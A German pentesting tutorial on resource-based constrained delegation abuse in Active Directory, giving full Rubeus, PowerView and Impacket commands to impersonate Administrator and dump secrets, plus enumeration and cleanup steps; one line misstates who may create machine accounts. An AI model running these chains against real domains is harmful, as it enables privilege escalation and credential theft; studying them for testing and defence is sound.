# Ressourcengestützte Eingeschränkte Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der ressourcengestützten eingeschränkten Delegation

Dies ist ähnlich wie die grundlegende [Eingeschränkte Delegation](constrained-delegation.md), aber **anstatt** Berechtigungen für ein **Objekt** zu erteilen, um **irgendeinen Benutzer gegen eine Maschine zu impersonieren**. Die ressourcengestützte eingeschränkte Delegation **legt** im **Objekt fest, wer in der Lage ist, irgendeinen Benutzer gegen es zu impersonieren**.

In diesem Fall hat das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der jeden anderen Benutzer gegen es impersonieren kann.

Ein weiterer wichtiger Unterschied dieser eingeschränkten Delegation zu anderen Delegationen ist, dass jeder Benutzer mit **Schreibberechtigungen über ein Maschinenkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das **_msDS-AllowedToActOnBehalfOfOtherIdentity_** setzen kann (Bei den anderen Formen der Delegation benötigten Sie Domain-Admin-Rechte).

### Neue Konzepte

Bei der eingeschränkten Delegation wurde gesagt, dass die **`TrustedToAuthForDelegation`**-Flagge im _userAccountControl_-Wert des Benutzers erforderlich ist, um eine **S4U2Self**-Anfrage durchzuführen. Aber das ist nicht ganz richtig.\
Die Realität ist, dass Sie auch ohne diesen Wert eine **S4U2Self**-Anfrage gegen jeden Benutzer durchführen können, wenn Sie ein **Dienst** (einen SPN haben) sind, aber wenn Sie **`TrustedToAuthForDelegation`** haben, wird das zurückgegebene TGS **Forwardable** sein, und wenn Sie **diese Flagge nicht haben**, wird das zurückgegebene TGS **nicht** **Forwardable** sein.

Wenn das **TGS**, das in **S4U2Proxy** verwendet wird, **NICHT Forwardable** ist, wird der Versuch, eine **grundlegende eingeschränkte Delegation** auszunutzen, **nicht funktionieren**. Aber wenn Sie versuchen, eine **ressourcengestützte eingeschränkte Delegation** auszunutzen, wird es funktionieren.

### Angriffsstruktur

> Wenn Sie **Schreibäquivalente Berechtigungen** über ein **Computer**-Konto haben, können Sie **privilegierten Zugriff** auf diese Maschine erhalten.

Angenommen, der Angreifer hat bereits **schreibäquivalente Berechtigungen über den Computer des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto, das einen **SPN** hat oder **erstellt einen** (“Service A”). Beachten Sie, dass **jeder** _Admin-Benutzer_ ohne andere spezielle Berechtigungen bis zu 10 Computerobjekte (**_MachineAccountQuota_**) **erstellen** und ihnen einen **SPN** zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und einen SPN festlegen.
2. Der Angreifer **missbraucht seine SCHREIBBERECHTIGUNG** über den Computer des Opfers (ServiceB), um die **ressourcengestützte eingeschränkte Delegation zu konfigurieren, die es ServiceA ermöglicht, jeden Benutzer** gegen diesen Computer des Opfers (ServiceB) zu impersonieren.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten SPN-Konto): Fordern Sie ein **TGS von Administrator an** (Nicht Forwardable).
2. S4U2Proxy: Verwenden Sie das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** zum **Opfer-Host** anzufordern.
3. Selbst wenn Sie ein nicht Forwardable TGS verwenden, wird es funktionieren, da Sie die ressourcengestützte eingeschränkte Delegation ausnutzen.
4. Der Angreifer kann **pass-the-ticket** und **impersonieren** den Benutzer, um **Zugriff auf den Opfer-ServiceB** zu erhalten.

Um das _**MachineAccountQuota**_ der Domäne zu überprüfen, können Sie Folgendes verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können ein Computerobjekt innerhalb der Domäne mit **[powermad](https://github.com/Kevin-Robertson/Powermad):** erstellen.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren der ressourcenbasierten eingeschränkten Delegation

**Verwendung des Active Directory PowerShell-Moduls**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies wird die RC4- und AES-Hashes für dieses Konto ausgeben.\
Jetzt kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können mehr Tickets für weitere Dienste generieren, indem Sie einmal mit dem Parameter `/altservice` von Rubeus anfragen:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachten Sie, dass Benutzer ein Attribut namens "**Kann nicht delegiert werden**" haben. Wenn ein Benutzer dieses Attribut auf Wahr hat, können Sie ihn nicht impersonifizieren. Dieses Attribut kann in BloodHound gesehen werden.

### Linux-Tools: End-to-End RBCD mit Impacket (2024+)

Wenn Sie von Linux aus arbeiten, können Sie die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notizen
- Wenn LDAP-Signierung/LDAPS durchgesetzt ist, verwenden Sie `impacket-rbcd -use-ldaps ...`.
- Bevorzugen Sie AES-Schlüssel; viele moderne Domänen schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only Flows.
- Impacket kann den `sname` ("AnySPN") für einige Tools umschreiben, aber erhalten Sie das korrekte SPN, wann immer möglich (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff durch und injiziert das TGS** vom Administrator auf den Zielhost in **den Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst vom Administrator angefordert, sodass Sie auf **C$** zugreifen können:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener Diensttickets

Erfahren Sie mehr über die [**verfügbaren Diensttickets hier**](silver-ticket.md#available-services).

## Auflisten, Prüfen und Bereinigen

### Computer mit RBCD konfiguriert auflisten

PowerShell (Dekodierung des SD zur Auflösung von SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lesen oder mit einem Befehl leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass es DES oder RC4 nicht verwendet, und Sie nur den RC4-Hash bereitstellen. Stellen Sie Rubeus mindestens den AES256-Hash zur Verfügung (oder geben Sie ihm einfach die rc4-, aes128- und aes256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht richtig funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername + Hashes nicht funktionieren, um sich anzumelden. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen anzugeben, als Sie die Hashes generiert haben (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Das kann bedeuten:
  - Der Benutzer, den Sie zu impersonieren versuchen, kann nicht auf den gewünschten Dienst zugreifen (weil Sie ihn nicht impersonieren können oder weil er nicht über ausreichende Berechtigungen verfügt)
  - Der angeforderte Dienst existiert nicht (wenn Sie ein Ticket für winrm anfordern, aber winrm nicht läuft)
  - Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und Sie müssen sie zurückgeben.
  - Sie missbrauchen klassisches KCD; denken Sie daran, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare erfordert.

## Hinweise, Relais und Alternativen

- Sie können auch die RBCD SD über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert ist. Siehe:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt lokalen SYSTEM zu erreichen. Siehe praktische End-to-End-Beispiele:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Referenzen

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (offiziell): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Schnelle Linux-Übersicht mit aktueller Syntax: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
